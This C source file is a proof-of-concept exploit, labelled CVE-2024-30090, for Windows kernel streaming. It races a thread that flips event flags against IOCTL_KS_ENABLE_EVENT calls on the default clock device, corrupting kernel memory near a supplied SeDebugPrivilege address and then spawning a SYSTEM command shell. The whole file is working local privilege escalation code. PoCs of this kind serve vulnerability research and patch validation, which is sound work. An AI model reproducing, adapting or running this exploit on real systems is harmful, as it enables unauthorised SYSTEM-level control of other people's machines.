#include <windows.h>
#include <stdio.h>
#include <ks.h>
#include "_ksproxy.h"
#include "winhelpers.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ksuser.lib")
#pragma comment(lib, "ksproxy.lib")

#define KSEVENTF_KSWORKITEM 0x00000080

typedef PVOID PKSWORKER;

typedef struct {
    ULONG       NotificationType;
    PVOID       Null_1;
    PKSWORKER   Null_2;
    ULONG_PTR   Null_3;
} MyKSEVENTDATA, * MyPKSEVENTDATA;

typedef struct {
    MyKSEVENTDATA   EventData;
    LONGLONG        KsWorkerObject;
    LONGLONG        Null_4;
    LONGLONG        TimeBase;
    LONGLONG        Interval;
    
} MYKSEVENT_TIME_INTERVAL, * PMYKSEVENT_TIME_INTERVAL;

KSEVENT g_ksevent = { 0 };
MYKSEVENT_TIME_INTERVAL g_eventData = { 0 };

void flip_thread() {
    ULONG xor_mask_flags = KSEVENT_TYPE_ENABLE ^ KSEVENT_TYPE_QUERYBUFFER;
    char name[] = "flip_thread";

    pin_name_to_cpu(name, CORE_ID_0, TRUE);
    set_priority_and_class(THREAD_PRIORITY_HIGHEST, HIGH_PRIORITY_CLASS);

    while (1) {
        g_ksevent.Flags ^= xor_mask_flags;
        Sleep(5);
    }
}

void SetClockState(HANDLE hDevice, KSSTATE state) {
    KSPROPERTY ksProperty = { 0 };
    ksProperty.Set = KSPROPSETID_Clock;
    ksProperty.Id = KSPROPERTY_CLOCK_STATE;
    ksProperty.Flags = KSPROPERTY_TYPE_SET;

    DWORD bytesReturned = 0;
    if (!DeviceIoControl(hDevice,
        IOCTL_KS_PROPERTY,
        &ksProperty,
        sizeof(ksProperty),
        &state,
        sizeof(state),
        &bytesReturned, NULL)) {
        printf("[ERROR] SetClockState. LastError: 0x%x\n", GetLastError());
    }
}

BOOL ExploitIoctlKsEnableEvent(DWORD64 target_addr) {
    HANDLE hClockDevice = INVALID_HANDLE_VALUE;
    HANDLE hFlipThread = INVALID_HANDLE_VALUE;
    DWORD bytesReturned = 0;
    DWORD inc_count = 0;
    HRESULT hr;

    g_ksevent.Set = KSEVENTSETID_Clock;
    g_ksevent.Id = KSEVENT_CLOCK_INTERVAL_MARK;

    g_eventData.EventData.NotificationType = KSEVENTF_KSWORKITEM;
    g_eventData.EventData.Null_1 = 0;
    g_eventData.EventData.Null_2 = 0;
    g_eventData.EventData.Null_3 = (ULONG_PTR)0;
    
    g_eventData.KsWorkerObject = (LONGLONG)(target_addr - 0x5C);
    g_eventData.Null_4 = 0;
    g_eventData.TimeBase = 30000000LL;
    g_eventData.Interval = 30000000LL;
    

    char name[] = "ExploitIoctlKsEnableEvent";
    pin_name_to_cpu(name, CORE_ID_1, TRUE);

    hFlipThread = xCreateThread(flip_thread, NULL, NULL, TRUE);

    while (inc_count < 3) {
        hr = KsOpenDefaultDevice(KSCATEGORY_CLOCK, GENERIC_READ | GENERIC_WRITE, &hClockDevice);
        if (!SUCCEEDED(hr) || hClockDevice == INVALID_HANDLE_VALUE)
        {
            printf("[ERROR] KsOpenDefaultDevice(KSCATEGORY_CLOCK, ..) LastError: 0x%x\n", GetLastError());
            return -1;
        }

        SetClockState(hClockDevice, KSSTATE_RUN);
        Sleep(2900);

        while (1) {
            bytesReturned = 0;
            g_ksevent.Flags = KSEVENT_TYPE_QUERYBUFFER;
            if (DeviceIoControl(
                hClockDevice,
                IOCTL_KS_ENABLE_EVENT,
                &g_ksevent,
                sizeof(KSEVENT) + 0x100,
                &g_eventData,
                sizeof(MYKSEVENT_TIME_INTERVAL),
                &bytesReturned,
                NULL)
                )
            {
                Sleep(1500);
                SetClockState(hClockDevice, KSSTATE_STOP);
                CloseHandle(hClockDevice);
                printf("race success ! %d/3\n", inc_count + 1);
                inc_count += 1;
                break;
            }
        }
    }

    return TRUE;
}

int main(int argc, char* argv[]) {
    DWORD64 ntosbase = 0;
    DWORD64	NtSeDebugPrivilegeVA = 0;

    printf("CVE-2024-30090 PoC - Child\n");

    if (argc != 2) {
        printf("Usage: %s <nt!SeDebugPrivilege VA>\n", argv[0]);
        exit(1);
    }

    NtSeDebugPrivilegeVA = strtoull(argv[1], NULL, 16);
    //printf("nt!SeDebugPrivilege VA @ 0x%llx\n", NtSeDebugPrivilegeVA);

    if (get_core_count() < 2) {
        printf("[!] Exploit currently requires at minimum 2 CPU cores\n");
        exit(2);
    }

    if (ExploitIoctlKsEnableEvent(NtSeDebugPrivilegeVA)) {
        spwan_cmd_system();
    }

    return 0;
}